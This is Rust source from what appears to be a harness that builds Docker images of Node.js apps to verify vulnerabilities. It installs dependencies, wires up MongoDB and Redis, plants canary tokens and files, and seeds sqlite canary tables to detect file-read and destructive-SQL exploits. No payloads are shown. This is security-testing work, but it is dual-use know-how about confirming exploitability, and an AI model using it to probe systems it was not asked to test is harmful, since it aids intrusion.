fn manifest_declared_deps(dir: &std::path::Path) -> std::collections::BTreeSet<String> {
    let mut out = std::collections::BTreeSet::new();
    let Ok(text) = std::fs::read_to_string(dir.join("package.json")) else {
        return out;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) else {
        return out;
    };
    for section in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        if let Some(obj) = json.get(section).and_then(serde_json::Value::as_object) {
            out.extend(obj.keys().cloned());
        }
    }
    out
}

/// Whether the dependency tree installed from `install_root` pulls in a package that compiles a
/// native (C/C++) addon at install time. Such a package drives `node-gyp` (directly, or through a
/// prebuild helper that falls back to it when no prebuilt binary matches the platform), which needs
/// a build toolchain — `python3`, `make`, a C++ compiler — that the slim base image does not carry.
/// Without it the native package's install script fails, and npm rolls the *entire* `node_modules`
/// back, so even the pure-JS runtime dependencies (the web framework, the router) go unresolved and
/// the app can never listen. This is a heuristic over the ecosystem's standard native-build helper
/// packages, matched in the lockfile or manifest — it names the build machinery, never the target's
/// own packages, so it stays general across repositories.
fn needs_native_toolchain(install_root: &std::path::Path) -> bool {
    // Distinctive helper package names: each appears only when a dependency builds or loads a native
    // addon. `node-gyp-build` is covered by the `node-gyp` substring.
    const HELPERS: [&str; 6] = [
        "node-addon-api",
        "node-gyp",
        "node-pre-gyp",
        "prebuild-install",
        "cmake-js",
        "prebuildify",
    ];
    for lock in [
        "package-lock.json",
        "npm-shrinkwrap.json",
        "yarn.lock",
        "pnpm-lock.yaml",
    ] {
        if let Ok(text) = std::fs::read_to_string(install_root.join(lock))
            && (text.contains("\"hasInstallScript\": true")
                || HELPERS.iter().any(|helper| text.contains(helper)))
        {
            return true;
        }
    }
    manifest_declared_deps(install_root)
        .iter()
        .any(|dep| HELPERS.contains(&dep.as_str()))
}

/// Whether a package runs an install-time lifecycle script (`preinstall`/`install`/`postinstall`/
/// `prepare`/`prepack`). Such a script often needs the real deployment to succeed (an Electron app
/// rebuilds native modules, downloads platform binaries), so a package that only lends its
/// dependencies to a bundled module is a poor install source when it carries one.
fn has_install_lifecycle(dir: &std::path::Path) -> bool {
    let Ok(text) = std::fs::read_to_string(dir.join("package.json")) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) else {
        return false;
    };
    json.get("scripts")
        .and_then(serde_json::Value::as_object)
        .is_some_and(|scripts| {
            ["preinstall", "install", "postinstall", "prepare", "prepack"]
                .iter()
                .any(|name| {
                    scripts
                        .get(*name)
                        .and_then(serde_json::Value::as_str)
                        .is_some_and(|command| !command.trim().is_empty())
                })
        })
}

/// Every package directory in the repo (relative to `root`), by a bounded breadth-limited walk that
/// skips `node_modules` and build output.
fn package_dirs(root: &std::path::Path) -> Vec<std::path::PathBuf> {
    const SKIP_DIRS: [&str; 5] = ["node_modules", ".git", "dist", "build", "coverage"];
    let mut out = Vec::new();
    let mut stack = vec![(root.to_path_buf(), 0u32)];
    while let Some((dir, depth)) = stack.pop() {
        if depth > 5 || out.len() >= 200 {
            break;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let Ok(kind) = entry.file_type() else {
                continue;
            };
            if kind.is_dir() {
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if !name.starts_with('.') && !SKIP_DIRS.contains(&name.as_ref()) {
                    stack.push((entry.path(), depth + 1));
                }
            } else if entry.file_name() == "package.json"
                && let Ok(rel) = dir.strip_prefix(root)
            {
                out.push(rel.to_path_buf());
            }
        }
    }
    out
}

/// The package that supplies the dependencies for a module whose own install directory declares none
/// of them. A repo can hold shared route/server modules in a directory with no manifest of its own
/// (`backend/`), whose dependencies are declared — and bundled at build time — by a sibling
/// application package (an Electron desktop app, an embedded mobile backend). Launching that module
/// then needs those dependencies on its module path, exactly as the real app arranges. Returns the
/// sibling package to install from (and whose `node_modules` the caller exposes via `NODE_PATH`), or
/// `None` when the install directory already declares what the module imports, or no clean sibling
/// does.
///
/// A provider must declare every package the module directly imports, must come from outside the
/// module's own (manifest-less) subtree, and must install without a lifecycle script that needs the
/// real deployment. Among those, the one whose dependencies cover the most of the subtree's imports
/// wins, then the tightest dependency set, then the shortest path — a deterministic choice.
fn dependency_provider(
    root: &std::path::Path,
    install_rel: &std::path::Path,
    module_rel: &std::path::Path,
) -> Option<std::path::PathBuf> {
    let module_src = std::fs::read_to_string(root.join(module_rel)).ok()?;
    // Only the module's load-time imports obligate a provider: a dependency `require`d lazily inside a
    // handler (an optional desktop/platform add-on) never runs when the module is loaded to publish
    // its routes, and demanding a provider also carry it would reject the sibling package that
    // supplies the module's real load-time dependencies — leaving nothing installed and the app unable
    // to start. Any lazy require that does fail at run time is stubbed by the launch shim.
    let direct = load_time_bare_specifiers(&module_src);
    if direct.is_empty() {
        return None;
    }
    let install_deps = manifest_declared_deps(&root.join(install_rel));
    if direct.iter().all(|dep| install_deps.contains(dep)) {
        return None;
    }
    // The module's own manifest-less subtree: the first path segment below the install directory.
    let relative = module_rel.strip_prefix(install_rel).ok()?;
    let std::path::Component::Normal(first) = relative.components().next()? else {
        return None;
    };
    let subtree = install_rel.join(first);
    let needed = subtree_specifiers(&root.join(&subtree));

    let mut best: Option<(usize, usize, std::path::PathBuf)> = None;
    for dir in package_dirs(root) {
        if dir == *install_rel || dir.starts_with(&subtree) {
            continue;
        }
        if has_install_lifecycle(&root.join(&dir)) {
            continue;
        }
        let deps = manifest_declared_deps(&root.join(&dir));
        if !direct.iter().all(|dep| deps.contains(dep)) {
            continue;
        }
        let coverage = needed.iter().filter(|dep| deps.contains(*dep)).count();
        let total = deps.len();
        let better = match &best {
            None => true,
            Some((best_cov, best_total, best_dir)) => {
                coverage > *best_cov
                    || (coverage == *best_cov && total < *best_total)
                    || (coverage == *best_cov
                        && total == *best_total
                        && dir.as_os_str().len() < best_dir.as_os_str().len())
                    || (coverage == *best_cov
                        && total == *best_total
                        && dir.as_os_str().len() == best_dir.as_os_str().len()
                        && dir < *best_dir)
            }
        };
        if better {
            best = Some((coverage, total, dir));
        }
    }
    best.map(|(_, _, dir)| dir)
}

fn db_service(app_root: &std::path::Path) -> bool {
    let Ok(manifest) = std::fs::read_to_string(app_root.join("package.json")) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&manifest) else {
        return false;
    };
    ["dependencies", "devDependencies", "optionalDependencies"]
        .iter()
        .filter_map(|section| json.get(section).and_then(serde_json::Value::as_object))
        .any(|dependencies| {
            dependencies.contains_key("mongodb") || dependencies.contains_key("mongoose")
        })
}

fn db_connection_env() -> Vec<(String, String)> {
    db_connection_env_for(DB_ALIASES[0], 27017)
}

fn local_db_connection_env() -> Vec<(String, String)> {
    db_connection_env_for("127.0.0.1", 27017)
}

fn db_connection_env_for(host: &str, port: u16) -> Vec<(String, String)> {
    let port = port.to_string();
    let url = format!("mongodb://{host}:{port}/{DB_NAME}");
    [
        ("MONGODB_HOST", host.to_owned()),
        ("MONGO_HOST", host.to_owned()),
        ("MONGODB_PORT", port.clone()),
        ("MONGO_PORT", port),
        ("MONGODB_DATABASE", DB_NAME.to_owned()),
        ("MONGODB_DB", DB_NAME.to_owned()),
        ("MONGO_DB", DB_NAME.to_owned()),
        ("MONGODB_URL", url.clone()),
        ("MONGODB_URI", url.clone()),
        ("MONGO_URL", url.clone()),
        ("MONGO_URI", url.clone()),
        ("DATABASE_URL", url),
    ]
    .into_iter()
    .map(|(name, value)| (name.to_owned(), value))
    .collect()
}

/// The directory of a `mongodump` export shipped in the repository: a directory that directly holds
/// at least one `<name>.bson` file beside its `<name>.metadata.json` sibling, the exact layout
/// `mongodump` writes. Returns the richest such directory (the most collection files) so a dump that
/// spans several databases selects the application database rather than an incidental one, and `None`
/// when the repository ships no dump. The walk skips `node_modules` and `.git`; the match is on the
/// generic mongodump file shape, never on a directory or repository name.
fn mongodump_dir(root: &std::path::Path) -> Option<std::path::PathBuf> {
    let mut best: Option<(usize, std::path::PathBuf)> = None;
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut collections = 0usize;
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                let name = entry.file_name();
                if name != "node_modules" && name != ".git" {
                    stack.push(path);
                }
            } else if path.extension().is_some_and(|ext| ext == "bson")
                && path.with_extension("metadata.json").is_file()
            {
                collections += 1;
            }
        }
        if collections > 0 && best.as_ref().is_none_or(|(n, _)| collections > *n) {
            best = Some((collections, dir));
        }
    }
    best.map(|(_, dir)| dir)
}

fn redis_service(app_root: &std::path::Path) -> bool {
    let Ok(manifest) = std::fs::read_to_string(app_root.join("package.json")) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&manifest) else {
        return false;
    };
    ["dependencies", "devDependencies", "optionalDependencies"]
        .iter()
        .filter_map(|section| json.get(section).and_then(serde_json::Value::as_object))
        .any(|dependencies| {
            dependencies.contains_key("redis")
                || dependencies.contains_key("ioredis")
                || dependencies.contains_key("rate-limit-redis")
        })
}

fn redis_connection_env() -> Vec<(String, String)> {
    redis_connection_env_for(REDIS_ALIASES[0], 6379)
}

fn local_redis_connection_env() -> Vec<(String, String)> {
    redis_connection_env_for("127.0.0.1", 6379)
}

fn redis_connection_env_for(host: &str, port: u16) -> Vec<(String, String)> {
    let port = port.to_string();
    let url = format!("redis://{host}:{port}");
    [
        ("REDIS_HOST", host.to_owned()),
        ("REDIS_PORT", port),
        ("REDIS_URL", url.clone()),
        ("CACHE_REDIS_URL", url.clone()),
        ("RATE_LIMIT_REDIS_URL", url),
    ]
    .into_iter()
    .map(|(name, value)| (name.to_owned(), value))
    .collect()
}

/// The Node image the app needs: the major of the lowest Node version `engines.node` of the
/// repo's `package.json` allows (`>=24.17` -> 24), never older than the default.
fn base_image(root: &std::path::Path) -> String {
    let major = std::fs::read_to_string(root.join("package.json"))
        .ok()
        .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
        .and_then(|json| {
            json.get("engines")
                .and_then(|engines| engines.get("node"))
                .and_then(|node| node.as_str())
                .and_then(engine_major)
        });
    match major {
        Some(major) if major > DEFAULT_NODE_MAJOR && major < 100 => format!("node:{major}-slim"),
        _ => BASE_IMAGE.to_owned(),
    }
}

/// Which package manager installs the app's dependencies, chosen by the lockfile present. A yarn or
/// pnpm project cannot be installed with `npm` (different lockfile, and npm rejects yarn-only
/// manifest features and strict peer dependencies), so install with the tool the repo targets.
#[derive(Clone, Copy, PartialEq, Eq)]
enum PackageManager {
    Npm,
    Yarn,
    Pnpm,
}

fn package_manager(root: &std::path::Path) -> PackageManager {
    if root.join("yarn.lock").is_file() {
        PackageManager::Yarn
    } else if root.join("pnpm-lock.yaml").is_file() {
        PackageManager::Pnpm
    } else {
        PackageManager::Npm
    }
}

/// The shell command that installs dependencies for a package manager. `corepack` provisions the
/// yarn/pnpm shim that ships with Node. Each prefers the lockfile-exact path and falls back to a
/// plain install, and tolerates total failure (`|| true`) so a broken install becomes a launch skip
/// rather than a build error. The npm fallback first attempts a peer-aware install, so a runtime
/// dependency a package declares only as an (unbundled) peer — the classic `request-promise` ->
/// `request` split, where `require('request-promise')` throws `Cannot find module 'request'` at load
/// and the server never listens — is actually installed, as modern npm does by default. Only if the
/// peer graph cannot be satisfied does it retry with `--legacy-peer-deps`, which the ecosystem's
/// strict default otherwise rejects. A final runtime-only, script-free pass recovers applications
/// whose development graph or postinstall is broken while their declared production dependencies
/// are installable; without it the missing-module shim can leave an inert HTTP listener that looks
/// ready but can never execute the real route.
fn install_command(pm: PackageManager) -> &'static str {
    match pm {
        PackageManager::Npm => {
            "npm ci --no-audit --no-fund || npm install --no-audit --no-fund || npm install --no-audit --no-fund --legacy-peer-deps || npm install --omit=dev --ignore-scripts --legacy-peer-deps --no-audit --no-fund || true"
        }
        PackageManager::Yarn => {
            "corepack enable && (yarn install --frozen-lockfile || yarn install) || true"
        }
        PackageManager::Pnpm => {
            // The plain fallback must relax the frozen lockfile: under `CI=true` pnpm freezes by
            // default, so a lockfile that no longer matches the manifest (a stale `overrides`,
            // added dependency) can only be installed with `--no-frozen-lockfile`.
            "corepack enable && (pnpm install --frozen-lockfile || pnpm install --no-frozen-lockfile) || true"
        }
    }
}

/// The build command for a package manager, run when the app declares a `build` script. A
/// production server (`next start`, `vite preview`, a compiled `dist/`) serves the build output and
/// will not start without it. Tolerated failure keeps a sub-step that needs the network (asset
/// downloads) from failing the image when the primary build has already produced its output.
fn build_command(pm: PackageManager, script: &str) -> String {
    // Next 16 enables Turbopack by default and rejects an existing custom `webpack` configuration
    // unless the build explicitly selects webpack. Older applications can therefore have a perfectly
    // valid `next build` script that starts failing only after a permissive semver range installs the
    // newer runtime. If the ordinary build fails and the package has a local Next binary, retry the
    // same production build with webpack; for every non-Next package the executable check is false.
    let next_fallback = if script == "build" {
        " || (test -x node_modules/.bin/next && node_modules/.bin/next build --webpack)"
    } else {
        ""
    };
    match pm {
        PackageManager::Npm => {
            format!("npm run {script} --if-present{next_fallback} || true")
        }
        PackageManager::Yarn => format!("yarn run {script}{next_fallback} || true"),
        PackageManager::Pnpm => format!("pnpm run {script}{next_fallback} || true"),
    }
}

/// The script that produces what the app's `start` launches. Normally `build`; when there is none,
/// a `compile` script is used only if `start` runs `node <file>` on a file absent from the
/// checkout — the start then depends on generated output (`"start": "node dist/index.js"` with
/// `"compile": "… cp -r server dist"`) and cannot launch without that step.
fn build_script(manifest: &str, app_root: &std::path::Path) -> Option<&'static str> {
    if has_build_script(manifest) {
        return Some("build");
    }
    let json = serde_json::from_str::<serde_json::Value>(manifest).ok()?;
    let scripts = json.get("scripts")?.as_object()?;
    let start = scripts.get("start")?.as_str()?;
    let mut words = start.split_whitespace();
    if words.next()? != "node" {
        return None;
    }
    let file = words.find(|word| !word.starts_with('-'))?;
    let generated = [".js", ".mjs", ".cjs"]
        .iter()
        .any(|ext| file.ends_with(ext))
        && !file.starts_with('/')
        && !file.split('/').any(|part| part == "..")
        && !app_root.join(file).exists();
    let compile = scripts
        .get("compile")
        .and_then(serde_json::Value::as_str)
        .is_some_and(|command| !command.trim().is_empty());
    (generated && compile).then_some("compile")
}

/// A cheap check for a `"build"` key under a `"scripts"` object, mirroring [`has_start_script`].
fn has_build_script(manifest: &str) -> bool {
    manifest.split("\"scripts\"").nth(1).is_some_and(|scripts| {
        let head = &scripts[..scripts.floor_char_boundary(2000)];
        head.contains("\"build\"")
    })
}

/// The first version number of a semver range: `>=24.17` and `^24.0.0 || ^22` -> 24 and 24.
fn engine_major(range: &str) -> Option<u32> {
    let digits: String = range
        .trim_start_matches(|c: char| !c.is_ascii_digit())
        .chars()
        .take_while(char::is_ascii_digit)
        .collect();
    digits.parse().ok()
}

/// Runs `docker build` with the Dockerfile on stdin and the context directory given, returning a
/// trimmed error log on failure.
fn build_from_dockerfile(dockerfile: &str, tag: &str, context: &str) -> Result<(), String> {
    let mut child = Command::new("docker")
        .args(docker_args(&["build", "-t", tag, "-f", "-", context]))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("could not run `docker build`: {e}"))?;
    use std::io::Write;
    child
        .stdin
        .take()
        .ok_or_else(|| "docker build: no stdin".to_owned())?
        .write_all(dockerfile.as_bytes())
        .map_err(|e| format!("writing the Dockerfile: {e}"))?;
    let output = child
        .wait_with_output()
        .map_err(|e| format!("docker build: {e}"))?;
    if !output.status.success() {
        let log = String::from_utf8_lossy(&output.stderr);
        return Err(format!(
            "building the app image failed (often a missing build step or native dependency):\n{}",
            tail(&log, 20)
        ));
    }
    Ok(())
}

/// `docker exec <container> <cmd...>`, capturing output.
/// A JSON array literal of the file paths, each escaped for embedding in a JavaScript source string.
fn js_string_array(files: &[String]) -> String {
    let items: Vec<String> = files
        .iter()
        .map(|f| format!("\"{}\"", f.replace('\\', "\\\\").replace('"', "\\\"")))
        .collect();
    format!("[{}]", items.join(","))
}

/// A `node:sqlite` script that, in every candidate database file, (re)creates the oracle's two canary
/// tables and plants one known row in each. The columns are mined from the destructive statement and
/// quoted as identifiers; row values are bound parameters. Files that cannot be opened or written are
/// skipped.
fn plant_rows_js(files: &[String], oracle: &payload::SqlDeleteOracle) -> String {
    format!(
        "const files = {files};\n\
         const T = \"{table}\", S = \"{sibling}\", C = {columns}, V = \"{value}\";\n\
         const qi = x => '\"' + String(x).replaceAll('\"', '\"\"') + '\"';\n\
         let sqlite; try {{ sqlite = require(\"node:sqlite\"); }} catch (e) {{ process.exit(0); }}\n\
         const {{ DatabaseSync }} = sqlite;\n\
         for (const f of files) {{\n\
           try {{\n\
             const db = new DatabaseSync(f);\n\
             try {{ db.exec(\"PRAGMA busy_timeout = 4000\"); }} catch (e) {{}}\n\
             for (const name of [T, S]) {{\n\
               const defs = C.map(column => qi(column) + ' TEXT').join(', ');\n\
               const names = C.map(qi).join(', ');\n\
               const marks = C.map(() => '?').join(', ');\n\
               db.exec('CREATE TABLE IF NOT EXISTS ' + qi(name) + ' (' + defs + ')');\n\
               db.exec('DELETE FROM ' + qi(name));\n\
               db.prepare('INSERT INTO ' + qi(name) + ' (' + names + ') VALUES (' + marks + ')')\n\
                 .run(...C.map(() => V));\n\
             }}\n\
             db.close();\n\
           }} catch (e) {{}}\n\
         }}\n",
        files = js_string_array(files),
        table = oracle.table,
        sibling = oracle.sibling,
        columns = js_string_array(&oracle.columns),
        value = oracle.planted_value,
    )
}

/// A `node:sqlite` script that prints the total number of rows of table `name` across every candidate
/// database file. Files that lack the table (or cannot be opened) contribute nothing.
fn count_rows_js(files: &[String], name: &str) -> String {
    format!(
        "const files = {files};\n\
         const name = \"{name}\";\n\
         const qi = x => '\"' + String(x).replaceAll('\"', '\"\"') + '\"';\n\
         let sqlite; try {{ sqlite = require(\"node:sqlite\"); }} catch (e) {{ console.log(-1); process.exit(0); }}\n\
         const {{ DatabaseSync }} = sqlite;\n\
         let total = 0;\n\
         for (const f of files) {{\n\
           try {{\n\
             const db = new DatabaseSync(f);\n\
             try {{ db.exec(\"PRAGMA busy_timeout = 4000\"); }} catch (e) {{}}\n\
             const r = db.prepare('SELECT count(*) AS c FROM ' + qi(name)).get();\n\
             total += Number(r.c) || 0;\n\
             db.close();\n\
           }} catch (e) {{}}\n\
         }}\n\
         console.log(total);\n",
        files = js_string_array(files),
        name = name,
    )
}

fn exec_in(container: &str, cmd: &[&str]) -> Result<Output, String> {
    let mut args = vec!["exec", container];
    args.extend_from_slice(cmd);
    Command::new("docker")
        .args(&args)
        .output()
        .map_err(|e| e.to_string())
}

/// The last 50 lines of a container's logs (stdout and stderr), for probing and diagnostics.
fn tail_logs(name: &str) -> String {
    Command::new("docker")
        .args(["logs", "--tail", "50", name])
        .output()
        .map(|o| {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            s
        })
        .unwrap_or_default()
}

/// The generated Dockerfile. `npm ci` when a lockfile is present (reproducible), else `npm
/// install`; both tolerate the absence of a build script. The marker file and the two helper
/// scripts are written through base64 so no shell or printf escaping can corrupt them.
#[allow(clippy::too_many_arguments)]
fn dockerfile(
    image: &str,
    install_workdir: &str,
    workdir: &str,
    canary: &Canary,
    start_command: &str,
    port: u16,
    pm: PackageManager,
    has_build: Option<&str>,
    native_build: bool,
    build_env: &[(String, String)],
) -> String {
    let token = &canary.token;
    // Plant the canary under every path it may be read through in one pass. The content is a JSON
    // string literal (`"<token>"`, the token being hex so always valid JSON), not the bare token:
    // a read handler that parses the file before returning it — `res.json(JSON.parse(readFile(p)))`,
    // the common shape for a sink that reads a `.json` data file — then reflects the token instead
    // of throwing on invalid JSON, while a handler that serves the bytes raw still echoes the token
    // as a substring. The token alone remains the signal; the quotes only let it survive a parse.
    let marker_files = canary.planted_files().join(" ");
    // A valid image planted beside the text canary, so a read sink that re-encodes the file instead
    // of echoing it still has an observably successful file-found branch (see [`payload::PLANTED_IMAGE`]).
    let canary_image_path = canary.planted_image_file();
    let canary_image_b64 = base64(payload::PLANTED_IMAGE_PNG);
    let install = install_command(pm);
    // npm cannot resolve the `workspace:` protocol a monorepo uses to pin its sibling packages, and
    // aborts the whole install the moment it parses one — so even unrelated registry dependencies
    // (the app's real runtime deps) never install, and the app cannot start. When installing a
    // single package with npm (no workspaces root in the image), drop only development-time sibling
    // specifiers first so registry dependencies install. Runtime/optional/peer siblings are left
    // intact: silently stubbing one could bypass security-relevant application behavior. yarn/pnpm
    // understand the protocol and are left as is.
    let workspace_fixup = if pm == PackageManager::Npm {
        format!("RUN {NPM_WORKSPACE_FIXUP}\n")
    } else {
        String::new()
    };
    // A dependency that compiles a native addon needs a C/C++ toolchain the slim base image omits;
    // without it the native install script fails and npm rolls back the whole `node_modules`, so even
    // the pure-JS runtime deps vanish and the app never listens. Install the toolchain (as the real
    // deployment's own Dockerfile does) only when a native-build helper is in the tree, so pure-JS
    // apps are not slowed. Tolerant: an apt hiccup degrades to the existing install-skip path.
    let native_toolchain = if native_build {
        format!("RUN {NATIVE_TOOLCHAIN_INSTALL}\n")
    } else {
        String::new()
    };
    let build = match has_build {
        Some(script) => format!("RUN {}\n", build_command(pm, script)),
        None => String::new(),
    };
    // Service connection variables (the MongoDB/Redis URL and friends) a real deployment exports
    // before it builds, set at image-build time as well as run time. A production build step
    // (`next build`, a bundler's data collection) imports the app's own modules, and a module that
    // reads a required service URL at load time (`if (!process.env.MONGODB_URL) throw`) aborts the
    // build when the variable is absent — leaving no production output for `next start` to serve, so
    // the sink is never reachable. The build never connects (the sidecar is a run-time peer); it only
    // needs the variable present. These are the same values the container gets at run time, so nothing
    // app-specific is introduced. Empty for an app with no detected datastore.
    let build_env_lines: String = build_env
        .iter()
        .map(|(name, value)| format!("ENV {name}={value}\n"))
        .collect();
    // Install and build in the directory that owns the manifest and lockfile, then move to the
    // launch directory so the app's `.env` seeding and `CMD` run with its own working directory.
    // When they coincide (an app launched from its own package) this is one directory throughout.
    format!(
        "FROM {image}\n\
         ENV CI=true\n\
         ENV COREPACK_ENABLE_DOWNLOAD_PROMPT=0\n\
         ENV TS_NODE_TRANSPILE_ONLY=true\n\
         {build_env_lines}\
         WORKDIR /app\n\
         COPY . /app\n\
         WORKDIR {install_workdir}\n\
         {native_toolchain}\
         {workspace_fixup}\
         RUN {install}\n\
         WORKDIR {workdir}\n\
         RUN for example in .env.example .env.sample .env.template; do \
         if [ ! -e .env ] && [ -f \"$example\" ]; then cp \"$example\" .env; fi; done\n\
         {build}\
         RUN for f in {marker_files}; do printf '\"%s\"' '{token}' > \"$f\"; done\n\
         RUN echo {canary_image_b64} | base64 -d > {canary_image_path}\n\
         RUN echo {} | base64 -d > /jss-driver.js\n\
         RUN echo {} | base64 -d > /jss-marker.js\n\
         RUN echo {} | base64 -d > /jss-marker.crt\n\
         RUN echo {} | base64 -d > /jss-marker.key\n\
         RUN echo {} | base64 -d > /jss-launch-shim.js\n\
         RUN echo {} | base64 -d > /jss-esm-hook.mjs\n\
         RUN echo {} | base64 -d > /jss-plugin-host.mjs\n\
         RUN echo {} | base64 -d > /jss-db-bootstrap.mjs\n\
         RUN echo {} | base64 -d > /jss-express-host.mjs\n\
         RUN echo {} | base64 -d > /jss-lifecycle-host.mjs\n\
         RUN echo {} | base64 -d > /jss-route-host.mjs\n\
         RUN echo {} | base64 -d > /jss-node-red-host.mjs\n\
         RUN echo {} | base64 -d > /jss-azure-func-host.cjs\n\
         RUN echo {} | base64 -d > /jss-worker-host.mjs\n\
         ENV NODE_EXTRA_CA_CERTS=/jss-marker.crt\n\
         ENV PORT={port}\n\
         ENV HOST=0.0.0.0\n\
         CMD {start_command}\n",
        base64(DRIVER_JS.as_bytes()),
        base64(MARKER_JS.as_bytes()),
        base64(MARKER_CERT.as_bytes()),
        base64(MARKER_KEY.as_bytes()),
        base64(LAUNCH_SHIM_JS.as_bytes()),
        base64(LAUNCH_ESM_HOOK_JS.as_bytes()),
        base64(PLUGIN_HOST_JS.as_bytes()),
        base64(DB_BOOTSTRAP_JS.as_bytes()),
        base64(EXPRESS_HOST_JS.as_bytes()),
        base64(LIFECYCLE_HOST_JS.as_bytes()),
        base64(ROUTE_HOST_JS.as_bytes()),
        base64(NODE_RED_HOST_JS.as_bytes()),
        base64(AZURE_FUNC_HOST_JS.as_bytes()),
        base64(WORKER_HOST_JS.as_bytes()),
    )
}

/// Strips `workspace:`-protocol dependency specifiers from the install directory's `package.json`
/// before an npm install, since npm cannot resolve that protocol and aborts the entire install on the
/// first one it sees. Edits in place and tolerates a missing or malformed manifest. Dependencies
/// removed here are development-only monorepo tools, never runtime dependencies.
/// Installs the native-addon build toolchain on the Debian-based slim base image: `python3`, `make`
/// and a C++ compiler — the same packages the project's own production Dockerfile installs to build
/// its native dependencies. Run as root during the image build. Tolerant (`|| true`) so a transient
/// apt failure degrades to the ordinary install-skip rather than breaking the whole build.
const NATIVE_TOOLCHAIN_INSTALL: &str = "apt-get update && apt-get install -y --no-install-recommends python3 make g++ && rm -rf /var/lib/apt/lists/* || true";

const NPM_WORKSPACE_FIXUP: &str = "node -e 'try{const fs=require(\"fs\");const j=JSON.parse(fs.readFileSync(\"package.json\",\"utf8\"));const o=j.devDependencies;if(o&&typeof o===\"object\")for(const k of Object.keys(o)){if(typeof o[k]===\"string\"&&o[k].indexOf(\"workspace:\")===0)delete o[k];}fs.writeFileSync(\"package.json\",JSON.stringify(j,null,2));}catch(e){}'";

/// Standard base64 (no line wrapping): the only characters produced are `A-Za-z0-9+/=`, all
/// shell-safe, so an embedded script survives the Dockerfile unchanged.
fn base64(input: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(input.len().div_ceil(3) * 4);
    for chunk in input.chunks(3) {
        let b0 = *chunk.first().unwrap_or(&0);
        let b1 = *chunk.get(1).unwrap_or(&0);
        let b2 = *chunk.get(2).unwrap_or(&0);
        let n = (u32::from(b0) << 16) | (u32::from(b1) << 8) | u32::from(b2);
        let push = |out: &mut String, shift: u32| {
            let idx = ((n >> shift) & 0x3f) as usize;
            out.push(*ALPHABET.get(idx).unwrap_or(&b'A') as char);
        };
        push(&mut out, 18);
        push(&mut out, 12);
        if chunk.len() > 1 {
            push(&mut out, 6);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            push(&mut out, 0);
        } else {
            out.push('=');
        }
    }
    out
}

/// An environment variable the app refused to start without, and the value it is given.
#[derive(Debug, Clone, PartialEq, Eq)]
struct RequiredEnv {
    name: String,
    value: String,
    /// The value is a directory (mounted empty and writable for the app).
    directory: bool,
}

/// Whether startup failed because a bare package dependency is absent. The launch shim can safely
/// stand in for that package on a retry; relative or absolute imports remain real application code
/// and must never be hidden.
fn missing_bare_module(log: &str) -> bool {
    const PREFIXES: [&str; 6] = [
        "Cannot find module '",
        "Cannot find package '",
        "Cannot find module \"",
        "Cannot find package \"",
        "Cannot find module `",
        "Cannot find package `",
    ];
    log.lines().any(|line| {
        PREFIXES.iter().any(|prefix| {
            let Some(rest) = line.split_once(prefix).map(|(_, rest)| rest) else {
                return false;
            };
            let quote = prefix.as_bytes().last().copied().unwrap_or(b'\'');
            let Some(end) = rest.bytes().position(|byte| byte == quote) else {
                return false;
            };
            rest.get(..end).is_some_and(|specifier| {
                !specifier.is_empty()
                    && !specifier.starts_with('.')
                    && !specifier.starts_with('/')
                    && !specifier.starts_with("node:")
            })
        })
    })
}

/// Whether an application awaited MongoDB's historical callback-only `Db.collections()` API and
/// then tried to iterate the resulting `undefined`. On a retry the launch shim adapts that one API
/// to a Promise while still executing the real driver operation against the verifier's MongoDB.
fn missing_mongodb_collection_promise(log: &str) -> bool {
    log.contains("TypeError: collections is not iterable")
}

/// Whether the application's first launch deliberately wrote its default configuration and exited.
/// Retrying once executes the documented second-start path against that generated file; unlike a
/// generic clean exit, the explicit generation message proves that another launch can make progress.
fn generated_startup_config(log: &str) -> bool {
    let lower = log.to_ascii_lowercase();
    (lower.contains("config file not found") || lower.contains("configuration file not found"))
        && (lower.contains("generating default") || lower.contains("creating default"))
}

/// Whether a Next production launcher reached the framework but could not serve because the build
/// artifact is absent. This is narrower than a generic build/start failure: Next itself confirms
/// that the application is installed and that its production launcher is the only blocker.
fn missing_next_production_build(log: &str) -> bool {
    log.contains("Could not find a production build in the '.next' directory")
        || log.contains("Could not find a production build in the `.next` directory")
}

/// The repository's own Next development launcher, used only after
/// [`missing_next_production_build`] proves that its production wrapper cannot start. Keeping the
/// manifest's `dev` script preserves project-specific flags and configuration while the explicit
/// host/port keep the verifier's listener deterministic.
fn next_development_command(root: &std::path::Path, port: u16) -> Option<Vec<String>> {
    let manifest = std::fs::read_to_string(root.join("package.json")).ok()?;
    let json: serde_json::Value = serde_json::from_str(&manifest).ok()?;
    let dev = json.get("scripts")?.get("dev")?.as_str()?;
    if !contains_command(dev, "next", "dev") {
        return None;
    }
    Some(vec![
        "npm".to_owned(),
        "run".to_owned(),
        "dev".to_owned(),
        "--".to_owned(),
        "--hostname".to_owned(),
        "127.0.0.1".to_owned(),
        "--port".to_owned(),
        port.to_string(),
    ])
}

/// When startup fails because the app tried to create or extend a file (or make a directory) but an
/// ancestor directory did not exist (`ENOENT` on a write), the directory the app expected its
/// deployment to provide as writable state (`$HOME/.app/.env` seeded before `$HOME/.app` is made).
/// The sandbox mounts it as empty writable scratch on the next attempt — the same neutral directory
/// a `_DIR` environment variable gets. Only a *write* qualifies: conjuring a directory for a failed
/// *read* could hide a file the app requires, so a read `ENOENT` is left as a genuine failure.
